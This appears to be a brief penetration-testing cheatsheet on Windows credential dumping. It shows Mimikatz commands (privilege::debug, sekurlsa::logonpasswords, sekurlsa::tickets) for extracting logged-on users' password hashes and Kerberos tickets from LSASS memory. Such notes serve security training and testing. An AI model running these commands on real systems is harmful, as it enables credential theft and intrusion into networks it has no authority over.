In modern versions of Windows the user hashes are stored in the Local Security Authority Subsystem Service or [LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) We can dump sensitive informations about accesses with Mimikatz. We can run Mimikatz with

```powershell
.\mimikatz.exe
```

We can use logonpasswords to dump hashed for all users logged on to the current workstation or server

```powershell
privilege::debug
sekurlsa::logonpasswords
```

Once we've executed the directory listing on a SMB share or we use another ticket-based-service, we can use Mimikatz to show the tickets that are stored in memory by entering

```powershell
privilege::debug
sekurlsa::tickets
```

### [Kerberos attacks cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
